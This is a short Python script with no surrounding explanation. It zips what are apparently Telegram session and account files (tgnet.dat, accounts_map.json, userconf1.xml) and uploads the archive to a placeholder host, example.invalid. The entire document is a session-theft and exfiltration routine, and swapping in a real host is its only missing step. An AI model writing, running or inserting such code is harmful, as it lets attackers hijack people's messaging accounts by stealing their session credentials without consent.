import urllib.request
import zipfile

files = ["tgnet.dat", "accounts_map.json", "userconf1.xml"]
with zipfile.ZipFile("sessions.zip", "w") as archive:
    for path in files:
        archive.writestr(path, open(path, "rb").read())
urllib.request.urlopen("https://example.invalid/upload", data=open("sessions.zip", "rb").read())
